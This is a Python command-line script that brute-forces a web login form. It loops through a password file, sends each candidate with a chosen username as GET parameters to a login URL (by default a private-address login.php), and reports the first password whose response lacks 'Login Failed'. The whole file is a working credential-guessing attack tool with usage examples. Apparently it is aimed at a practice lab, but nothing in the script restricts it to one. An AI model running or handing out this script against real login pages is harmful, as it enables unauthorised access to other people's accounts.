import requests
import argparse
import sys


# Function to perform brute-force
def brute_force_login(url, username, password_file):
    try:
        with open(password_file, "r") as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(f"[!] Password file not found: {password_file}")
        sys.exit(1)

    for password in passwords:
        password = password.strip()
        # Make an HTTP GET request with username and password
        params = {"username": username, "password": password, "login": ""}
        response = requests.get(url, params=params)

        # Check if login is successful
        if "Login Failed" not in response.text:
            print(f"[+] Login successful with password: {password}")
            return

        print(f"[-] Tried password: {password} - Failed")

    print("[!] No valid password found.")


# Main function to parse arguments and call brute-force
def main():
    parser = argparse.ArgumentParser(
        description="Perform brute-force attack using a password file."
    )
    parser.add_argument(
        "-u", "--username", required=True, help="Username to brute-force."
    )
    parser.add_argument(
        "-p", "--password-file", required=True, help="Path to the password file."
    )
    parser.add_argument(
        "--url",
        default="http://172.0.0.2/login.php",
        help="Login form URL (default: http://172.0.0.2/login.php).",
    )

    args = parser.parse_args()

    # Validate arguments
    if not args.username or not args.password_file:
        print("[!] Invalid arguments provided.")
        print_usage()
        sys.exit(1)

    # Call brute-force function
    brute_force_login(args.url, args.username, args.password_file)


# Print usage format
def print_usage():
    print(
        "\nUsage: python3 bruteforce_paswd.py -u <username> -p <password_file> [--url <login_url>]"
    )
    print("\nExample:")
    print("  python3 bruteforce_paswd.py -u user1 -p passwords.txt")
    print(
        "  python3 bruteforce_paswd.py -u admin -p /path/to/passwords.txt --url http://example.com/login\n"
    )


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[!] Error: {e}")
        print_usage()
        sys.exit(1)
